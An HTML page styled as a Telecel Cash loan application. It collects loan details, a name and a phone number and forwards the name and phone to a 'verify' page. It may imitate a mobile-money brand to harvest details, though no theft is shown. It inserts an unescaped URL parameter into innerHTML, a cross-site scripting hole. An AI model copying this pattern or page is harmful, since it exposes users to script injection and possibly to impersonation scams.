<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apply for Loan - Telecel Cash</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
    <style>
        :root {
            --red: #E42320;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f8f9fa;
            color: #1e2937;
            min-height: 100vh;
            padding: 15px;
        }
        .container {
            max-width: 520px;
            margin: 30px auto;
            background: white;
            border-radius: 24px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .logo-section {
            text-align: center;
            padding: 25px 0 10px;
        }
        .logo svg { width: 78px; height: 78px; }
        h1 {
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            margin: 8px 0 5px;
        }
        .subtitle {
            text-align: center;
            color: #475569;
            font-size: 15px;
            padding: 0 20px 20px;
        }

        /* Progress Bar */
        .progress {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin: 20px 30px;
        }
        .progress-bar {
            height: 6px;
            flex: 1;
            background: #e2e8f0;
            border-radius: 10px;
        }
        .progress-bar.active {
            background: var(--red);
        }

        .content {
            padding: 0 25px 35px;
        }
        .form-group {
            margin-bottom: 22px;
        }
        label {
            display: block;
            font-size: 14.5px;
            font-weight: 600;
            margin-bottom: 7px;
            color: #1e2937;
        }
        input, select {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 16px;
        }
        input:focus, select:focus {
            border-color: var(--red);
            box-shadow: 0 0 0 4px rgba(228, 35, 32, 0.1);
            outline: none;
        }
        .btn {
            width: 100%;
            background: var(--red);
            color: white;
            border: none;
            padding: 16px;
            font-size: 17px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 10px;
        }
        .back-btn {
            background: #e2e8f0;
            color: #475569;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo -->
        <div class="logo-section">
            <svg width="96" height="96" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M48.19 28.6833C40.4333 28.605 34.1983 34.9933 34.2183 42.58C34.2383 50.625 40.9883 56.56 48.0333 56.4317C55.5033 56.5017 61.8867 50.53 61.9517 42.7583C62.02 34.62 55.575 28.76 48.19 28.6833ZM53.7333 38.1633C53.6017 39.2783 52.9467 39.9367 51.93 40.29C51.3683 40.4867 50.7833 40.4917 50.195 40.4917C49.8333 40.49 49.4683 40.46 49.1067 40.5183C48.8467 40.5617 48.7033 40.6917 48.6667 40.97C48.6133 41.3467 48.6917 41.7133 48.6883 42.085C48.6867 43.6083 48.6883 45.135 48.6867 46.6583C48.6867 46.9117 48.7133 47.1617 48.7667 47.4067C48.9833 48.3783 49.7917 48.955 50.7817 48.8333C51.5417 48.7383 52.31 48.7333 53.0733 48.6683C53.3933 48.6417 53.495 48.7833 53.4717 49.1233C53.435 49.6333 53.4383 50.1433 53.47 50.655C53.535 51.715 53.0383 52.4717 52.1333 52.8467C49.6867 53.8583 47.2717 53.835 45.065 52.2417C43.8517 51.3667 43.2033 50.115 43.1333 48.57C43.0467 46.585 43.0117 44.6 42.9517 42.6117C42.8883 40.605 42.9083 38.5967 42.9233 36.59C42.9333 35.2433 43.5583 34.15 44.5517 33.265C45.1033 32.7717 45.7183 32.37 46.3867 32.05C46.9933 31.7583 47.6283 31.6483 48.295 31.6583C48.5333 31.6633 48.6233 31.7533 48.6467 31.9983C48.7117 32.6333 48.68 33.27 48.6933 33.8517C48.6933 34.3667 48.6883 34.8317 48.6933 35.295C48.695 35.6983 48.8383 35.845 49.2467 35.905C49.5283 35.9483 49.8083 35.9117 50.09 35.91C51.06 35.8983 52.0267 35.8983 52.9967 35.905C53.5683 35.9117 53.745 36.0867 53.7283 36.6517C53.7117 37.1567 53.7967 37.655 53.7383 38.1633H53.7333Z" fill="#E32526"/>
            </svg>
        </div>

        <h1>Loan Application</h1>
        <p class="subtitle" id="stepTitle">Step 1: Loan Details</p>

        <!-- Progress -->
        <div class="progress">
            <div class="progress-bar active" id="bar1"></div>
            <div class="progress-bar" id="bar2"></div>
            <div class="progress-bar" id="bar3"></div>
        </div>

        <!-- STEP 1: Loan Details -->
        <div id="step1">
            <div class="form-group">
                <label>Loan Type</label>
                <select id="loanType">
                    <option value="">Select a loan type...</option>
                    <option value="Emergency">Emergency Cash</option>
                    <option value="Business">Business Growth</option>
                    <option value="School">School Fees</option>
                    <option value="Medical">Medical Support</option>
                </select>
            </div>
            <div class="form-group">
                <label>Loan Amount (GHS)</label>
                <input type="number" id="amount" placeholder="e.g. 5000" value="10000">
            </div>
            <div class="form-group">
                <label>Repayment Term</label>
                <select id="duration">
                    <option value="">Select duration...</option>
                    <option value="14">14 Days</option>
                    <option value="30" selected>30 Days</option>
                    <option value="45">45 Days</option>
                    <option value="60">60 Days</option>
                    <option value="90">90 Days</option>
                </select>
            </div>
            <button onclick="nextStep(1)" class="btn">Next Step →</button>
        </div>

        <!-- STEP 2: Personal Info -->
        <div id="step2" style="display:none;">
            <div class="form-group">
                <label>First Name</label>
                <input type="text" id="firstName" placeholder="Legal First Name">
            </div>
            <div class="form-group">
                <label>Last Name</label>
                <input type="text" id="lastName" placeholder="Legal Last Name">
            </div>
            <div class="form-group">
                <label>Telecel Phone Number</label>
                <input type="tel" id="phone" placeholder="0270 000 000" maxlength="10">
            </div>
            <button onclick="prevStep()" class="btn back-btn" style="background:#e2e8f0; color:#475569;">Back</button>
            <button onclick="nextStep(2)" class="btn">Next Step →</button>
        </div>

        <!-- STEP 3: Financial Profile -->
        <div id="step3" style="display:none;">
            <div class="loan-info" id="summary">
                <!-- Filled by JS -->
            </div>
            <button onclick="prevStep()" class="btn back-btn" style="background:#e2e8f0; color:#475569;">Back</button>
            <button onclick="goToVerify()" class="btn">Confirm & Apply ✓</button>
        </div>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const loanName = params.get('name') || 'Flex Loan';
        const amount = params.get('amount') || '10000';
        const repay = params.get('repay') || '11200';
        const duration = params.get('duration') || '30';

        let currentStep = 1;

        function updateSummary() {
            document.getElementById('summary').innerHTML = `
                <strong>Application Summary</strong><br>
                Applicant: <span id="applicantName">Customer</span><br>
                Loan Request: GHS ${parseInt(amount).toLocaleString()}<br>
                Duration: ${duration} Days<br>
                Est. Total Repayment: GHS ${parseInt(repay).toLocaleString()}
            `;
        }

        function nextStep(step) {
            document.getElementById(`step${currentStep}`).style.display = 'none';
            currentStep = step + 1;
            document.getElementById(`step${currentStep}`).style.display = 'block';
            document.getElementById('stepTitle').textContent = `Step ${currentStep}: ${currentStep === 3 ? 'Financial Profile' : currentStep === 2 ? 'Personal Info' : 'Loan Details'}`;
            
            if (currentStep === 3) updateSummary();
        }

        function prevStep() {
            document.getElementById(`step${currentStep}`).style.display = 'none';
            currentStep--;
            document.getElementById(`step${currentStep}`).style.display = 'block';
            document.getElementById('stepTitle').textContent = `Step ${currentStep}: ${currentStep === 1 ? 'Loan Details' : 'Personal Info'}`;
        }

        function goToVerify() {
            const firstName = document.getElementById('firstName').value || "Customer";
            const phone = document.getElementById('phone').value;

            const url = `verify.html?name=${encodeURIComponent(loanName)}&amount=${amount}&repay=${repay}&duration=${duration}&firstName=${encodeURIComponent(firstName)}&phone=${phone}`;
            window.location.href = url;
        }

        // Initialize
        window.onload = () => {
            document.getElementById('stepTitle').textContent = "Step 1: Loan Details";
        };
    </script>
</body>
</html>
